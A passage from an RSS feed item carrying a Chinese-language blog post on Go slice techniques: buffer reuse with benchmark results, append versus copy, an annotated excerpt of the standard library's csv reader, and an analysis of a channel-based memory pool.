        res[i] = string(b)
    }

    return res
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;SliceInt2String5&lt;/code&gt; 中使用 &lt;code&gt;b = b[:0]&lt;/code&gt; 来促使达到反复使用一块缓冲区，写了一个性能测试（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string_test.go#L85&quot;&gt;源码在GitHub&lt;/a&gt;），看一下效果吧:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;goos: darwin
goarch: amd64
pkg: github.com/thinkeridea/example/slice
BenchmarkSliceInt2String4-8       300000          4420 ns/op        1440 B/op         82 allocs/op
BenchmarkSliceInt2String5-8      1000000          1102 ns/op         432 B/op         10 allocs/op
PASS
ok      github.com/thinkeridea/example/slice    8.364s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;较 &lt;code&gt;+&lt;/code&gt; 版本提升接近4倍的性能，这是使用 &lt;code&gt;slice&lt;/code&gt; 作为缓冲区极好的技巧，使用非常方便，并不用使用 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt;， &lt;code&gt;slice&lt;/code&gt; 操作非常的简单实用。&lt;/p&gt;
&lt;h2 id=&quot;append-与-copy&quot;&gt;append 与 copy&lt;/h2&gt;
&lt;p&gt;如果合并多个 &lt;code&gt;slice&lt;/code&gt; 为一个，有三种方式来合并，主要合并差异来源于创建新 &lt;code&gt;slice&lt;/code&gt; 的方法，使用 &lt;code&gt;var news []int&lt;/code&gt; 或者 &lt;code&gt;news:=make([]int, 0, len(s1)+len(s2)....)&lt;/code&gt; 的方式创建的新变量就需要使用 &lt;code&gt;append&lt;/code&gt; 来合并，如果使用 &lt;code&gt;news:=make([]int, len(s1)+len(s2)....)&lt;/code&gt; 就需要使用 &lt;code&gt;copy&lt;/code&gt; 来合并。不同的方法也有差异，&lt;code&gt;append&lt;/code&gt; 和 &lt;code&gt;copy&lt;/code&gt; 在这个例子中主要差异在于 &lt;code&gt;append&lt;/code&gt; 适用于零长度的初始化 &lt;code&gt;slice&lt;/code&gt;， &lt;code&gt;copy&lt;/code&gt; 适用于确定长度的 &lt;code&gt;slice&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;写了一个测试来看看两者的差异吧（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/append_and_copy_test.go&quot;&gt;源码在GitHub&lt;/a&gt;）：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func BenchmarkExperiment3Append1(b *testing.B) {
    for i := 0; i &amp;lt; b.N; i++ {
        var s []int
        for j := 0; j &amp;lt; 20; j++ {
            s = append(s, []int{j, j + 1, j + 2, j + 3, j + 4}...)
        }
    }
}

func BenchmarkExperiment3Append2(b *testing.B) {
    for i := 0; i &amp;lt; b.N; i++ {
        s := make([]int, 0, 100)
        for j := 0; j &amp;lt; 20; j++ {
            s = append(s, []int{j, j + 1, j + 2, j + 3, j + 4}...)
        }
    }
}

func BenchmarkExperiment3Copy(b *testing.B) {
    for i := 0; i &amp;lt; b.N; i++ {
        s := make([]int, 100)
        n := 0
        for j := 0; j &amp;lt; 20; j++ {
            n += copy(s[n:], []int{j, j + 1, j + 2, j + 3, j + 4})
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试结果如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;goos: darwin
goarch: amd64
pkg: github.com/thinkeridea/example/slice
BenchmarkExperiment3Append1-8        2000000           782 ns/op        3024 B/op          6 allocs/op
BenchmarkExperiment3Append2-8       10000000           192 ns/op           0 B/op          0 allocs/op
BenchmarkExperiment3Copy-8          10000000           217 ns/op           0 B/op          0 allocs/op
PASS
ok      github.com/thinkeridea/example/slice    6.926s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从结果上来看使用没有容量的 &lt;code&gt;append&lt;/code&gt; 性能真的很糟糕，实际上不要对没有任何容量的 &lt;code&gt;slice&lt;/code&gt; 进行 &lt;code&gt;append&lt;/code&gt; 操作是最好的实践，在准备用 &lt;code&gt;append&lt;/code&gt; 的时候应该预先给定一个容量，哪怕这个容量并不是确定的，像前面缓存连接字符串时一样，并不能明确使用的空间，先分配256个字节，这样的好处是可以减少系统调用分配内存的次数，即使空间不能用完，也不用太过担心浪费，&lt;code&gt;append&lt;/code&gt; 本身扩容机制也会导致空间不是刚刚好用完的，而初始化的容量往往结合业务场景给的一个均值，这是很好的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;append&lt;/code&gt; 和 &lt;code&gt;copy&lt;/code&gt; 在预先确定长度和容量时 &lt;code&gt;append&lt;/code&gt; 效果更好一些，主要原因是 &lt;code&gt;copy&lt;/code&gt; 需要一个变量来记录位置。 如果使用场景中没有强制限定长度，建议使用 &lt;code&gt;append&lt;/code&gt; 因为 &lt;code&gt;append&lt;/code&gt; 会根据实际情况再做内存分配，较 &lt;code&gt;copy&lt;/code&gt; 也更加灵活一些， 而 &lt;code&gt;copy&lt;/code&gt; 往往用在长度固定的地方，可以防止数据长度溢出的问题，例如标准库中 &lt;code&gt;strings.Repeat&lt;/code&gt; 函数，它采用指数增长的方式快速填充指定数量的字符，但是如果使用 &lt;code&gt;append&lt;/code&gt; 就会发生多余的内存分配，导致长度溢出。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func Repeat(s string, count int) string {
    b := make([]byte, len(s)*count)
    bp := copy(b, s)
    for bp &amp;lt; len(b) {
        copy(b[bp:], b[:bp])
        bp *= 2
    }
    return string(b)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;csv-reader-中的一个例子&quot;&gt;csv reader 中的一个例子&lt;/h2&gt;
&lt;p&gt;官方标准库 &lt;code&gt;csv&lt;/code&gt; 的读取性能极高，其中 &lt;code&gt;reader&lt;/code&gt; 里面有使用 &lt;code&gt;slice&lt;/code&gt; 极好的例子，以下是简略的代码，如果想要全面了解程序需要去看标准库的源码：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (r *Reader) readRecord(dst []string) ([]string, error) {
    line, errRead = r.readLine()
    if errRead == io.EOF {
        return nil, errRead
    }
    r.recordBuffer = r.recordBuffer[:0]
    r.fieldIndexes = r.fieldIndexes[:0]
parseField:
    for {
        if r.TrimLeadingSpace {
            line = bytes.TrimLeftFunc(line, unicode.IsSpace)
        }
            i := bytes.IndexRune(line, r.Comma)
            field := line
            if i &amp;gt;= 0 {
                field = field[:i]
            } else {
                field = field[:len(field)-lengthNL(field)]
            }
            
            r.recordBuffer = append(r.recordBuffer, field...)
            r.fieldIndexes = append(r.fieldIndexes, len(r.recordBuffer))
            if i &amp;gt;= 0 {
                line = line[i+commaLen:]
                continue parseField
            }
            break parseField
    }
    
    if err == nil {
        err = errRead
    }

    // Create a single string and create slices out of it.
    // This pins the memory of the fields together, but allocates once.
    str := string(r.recordBuffer) // Convert to string once to batch allocations
    dst = dst[:0]
    if cap(dst) &amp;lt; len(r.fieldIndexes) {
        dst = make([]string, len(r.fieldIndexes))
    }
    dst = dst[:len(r.fieldIndexes)]
    var preIdx int
    for i, idx := range r.fieldIndexes {
        dst[i] = str[preIdx:idx]
        preIdx = idx
    }
    return dst, err
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里删除了极多的代码，但是能看懂大意，其中 &lt;code&gt;line&lt;/code&gt; 是一段 &lt;code&gt;bufio&lt;/code&gt; 中的一段引用，所以这块数据不能返回给用户，也不能进行并发读取操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;r.recordBuffer&lt;/code&gt; 和 &lt;code&gt;r.fieldIndexes&lt;/code&gt; 是 &lt;code&gt;csv&lt;/code&gt; 的缓存，他们初始的时候容量是0，是不是会有些奇怪，之前还建议 &lt;code&gt;slice&lt;/code&gt; 初始一个长度，来减少内存分配，&lt;code&gt;csv&lt;/code&gt; 这个库的设计非常的巧妙，假设 &lt;code&gt;csv&lt;/code&gt; 每行字段的个数一样，数据长度也相近，现实业务确实如此，所以只有读取第一行数据的时候才会发生大量的 &lt;code&gt;slice&lt;/code&gt; 扩容， 之后其它行扩容的可能性非常的小，整个文件读取完也不会发生太多次，不得不说设计的太妙了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;r.recordBuffer&lt;/code&gt; 用来存储行中除了分隔符的所有数据，&lt;code&gt;r.fieldIndexes&lt;/code&gt; 用来存储每个字段数据在 &lt;code&gt;r.recordBuffer&lt;/code&gt; 中的索引。每次都通过 &lt;code&gt;r.recordBuffer[:0]&lt;/code&gt; 这个的数据获取，读取每行数据都反复使用这块内存，极大的减少内存开销。&lt;/p&gt;
&lt;p&gt;更巧妙的设计是 &lt;code&gt;str := string(r.recordBuffer)&lt;/code&gt; 源代码中也有详细的说明，一次性分配足够的内存， 要知道类型转换是会发生内存拷贝的，分配新的内存， 如果每个字段转换一次，会发生很多的内存拷贝和分配，之后通过 &lt;code&gt;dst[i] = str[preIdx:idx]&lt;/code&gt; 引用 &lt;code&gt;str&lt;/code&gt; 中的数据达到切分字段的效果，因为引用字符串并不会拷贝字符串（字符串不可变，引用字符串的子串是安全的）所以其代价非常的小。&lt;/p&gt;
&lt;p&gt;这段源码中还有一个很多人都不知道的 &lt;code&gt;slice&lt;/code&gt; 特性的例子，&lt;code&gt;dst = dst[:0]; dst = dst[:len(r.fieldIndexes)]&lt;/code&gt; 这两句话放到一起是不是感觉很不可思议，明明 &lt;code&gt;dst&lt;/code&gt; 的长度被清空了，&lt;code&gt;dst[:len(r.fieldIndexes)]&lt;/code&gt; 不是会发生索引越界吗，很多人认为 &lt;code&gt;s[i:l]&lt;/code&gt; 这种写法是当前 &lt;code&gt;slice&lt;/code&gt; 的索引，实际并非如此，这里面的 &lt;code&gt;i&lt;/code&gt; 和 &lt;code&gt;j&lt;/code&gt; 是底层引用数组相对当前 &lt;code&gt;slice&lt;/code&gt; 引用位置的索引，并不受当前 &lt;code&gt;slice&lt;/code&gt; 的长度的影响。&lt;/p&gt;
&lt;p&gt;这里只是简单引用 &lt;code&gt;csv&lt;/code&gt; 源码中的一段分析其 &lt;code&gt;slice&lt;/code&gt; 的巧妙用法，即把 &lt;code&gt;slice&lt;/code&gt; 当做数据缓存，也作为分配内存的一种极佳的方法，这个示例中的关于 &lt;code&gt;slice&lt;/code&gt; 的使用值得反复推敲。&lt;/p&gt;
&lt;h2 id=&quot;内存池&quot;&gt;内存池&lt;/h2&gt;
&lt;p&gt;早些时间阅读 GitHub 上的一些源码，发现一个实现内存次的例子，里面对 &lt;code&gt;slice&lt;/code&gt; 的应用非常有特点，在这里拿来分析一下（&lt;a href=&quot;https://github.com/funny/slab/blob/master/chan_pool.go&quot;&gt;GitHub源码&lt;/a&gt;）：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func NewChanPool(minSize, maxSize, factor, pageSize int) *ChanPool {
    pool := &amp;amp;ChanPool{make([]chanClass, 0, 10), minSize, maxSize}
    for chunkSize := minSize; chunkSize &amp;lt;= maxSize &amp;amp;&amp;amp; chunkSize &amp;lt;= pageSize; chunkSize *= factor {
        c := chanClass{
            size:   chunkSize,
            page:   make([]byte, pageSize),
            chunks: make(chan []byte, pageSize/chunkSize),
        }
        c.pageBegin = uintptr(unsafe.Pointer(&amp;amp;c.page[0]))
        for i := 0; i &amp;lt; pageSize/chunkSize; i++ {
            // lock down the capacity to protect append operation
            mem := c.page[i*chunkSize : (i+1)*chunkSize : (i+1)*chunkSize]
            c.chunks &amp;lt;- mem
            if i == len(c.chunks)-1 {
                c.pageEnd = uintptr(unsafe.Pointer(&amp;amp;mem[0]))
            }
        }
        pool.classes = append(pool.classes, c)
    }
    return pool
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里采用步进式分页，保证每页上的数据块大小相同，一次性创建整个页 &lt;code&gt;make([]byte, pageSize)&lt;/code&gt; ，之后从页切分数据块 &lt;code&gt;mem := c.page[i*chunkSize : (i+1)*chunkSize : (i+1)*chunkSize]&lt;/code&gt;， 容量和数据块长度一致，创建一块较大的内存，减少系统调用，当然这个例子中还可以创建更大的内存，就是每页容量的总大小，避免创建更多页，所有的块数据都引用一块内存。&lt;/p&gt;
&lt;p&gt;这里限制了每个块的容量，默认引用 &lt;code&gt;slice&lt;/code&gt; 的容量是引用起始位置到底层数组的结尾，但是可以指定容量，这就保证了获取的数据块不会因为用户不遵守约定超出其大小导致数据写入到其它块中的问题，设定了容量用户使用超出容量后就会拷贝出去并创建新的 &lt;code&gt;slice&lt;/code&gt; 实在的很妙的用法。&lt;/p&gt;
&lt;p&gt;一次分配更大的内存可以减少内存碎片，更好的复用内存。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (pool *ChanPool) Alloc(size int) []byte {
    if size &amp;lt;= pool.maxSize {
        for i := 0; i &amp;lt; len(pool.classes); i++ {
            if pool.classes[i].size &amp;gt;= size {
                mem := pool.classes[i].Pop()
                if mem != nil {
                    return mem[:size]
                }
                break
            }
        }
    }
    return make([]byte, size)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;获取内存池中的内存就非常简单，查找比需要大小更大的块并返回即可，这不失为一个较好的内存复用算法。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (pool *ChanPool) Free(mem []byte) {
    size := cap(mem)
    for i := 0; i &amp;lt; len(pool.classes); i++ {
        if pool.classes[i].size == size {
            pool.classes[i].Push(mem)
            break
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当使用完释放内存时实现的并不是很好，应该判断释放的数据是否是当前内存的一部分，如果不是的就不能放回到内存池中，因为用户未按约定大小使用，导致大量扩容而使得内存池中的数据碎片化，当然用户一旦发生扩容就会导致内存池中的缓存块丢失，导致存在大块内存无法释放，却也没法使用的情况。&lt;/p&gt;
&lt;p&gt;之所以分析这个例子主要是分析其使用 &lt;code&gt;slice&lt;/code&gt; 的方法和技巧，并不推荐使用该方法管理内存。&lt;/p&gt;
&lt;h2 id=&quot;拓展&quot;&gt;拓展&lt;/h2&gt;
&lt;p&gt;更多关于 &lt;code&gt;slice&lt;/code&gt; 应用的例子可以参考标准库 &lt;code&gt;bytes&lt;/code&gt; 与 &lt;code&gt;bufio&lt;/code&gt;， &lt;code&gt;buffer&lt;/code&gt; 与 &lt;code&gt;bufio&lt;/code&gt; 的使用极其相似，两个包都是使用 &lt;code&gt;slice&lt;/code&gt; 来减少内存分配及系统调用来达到实现缓冲和缓存的例子。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;转载：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文作者： 戚银（&lt;a href=&quot;https://blog.thinkeridea.com/&quot;&gt;thinkeridea&lt;/a&gt;）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文链接： &lt;a href=&quot;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&quot; class=&quot;uri&quot;&gt;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;版权声明： 本博客所有文章除特别声明外，均采用 &lt;a href=&quot;http://creativecommons.org/licenses/by/4.0/deed.zh&quot;&gt;CC BY 4.0 CN协议&lt;/a&gt; 许可协议。转载请注明出处！&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 14:47:00 +0000</pubDate>
<dc:creator>戚银</dc:creator>
<og:description>原文链接： 'https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html' 是 语言十分重要的数据类型，它</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/thinkeridea/p/10317417.html</dc:identifier>
</item>
</channel>
</rss>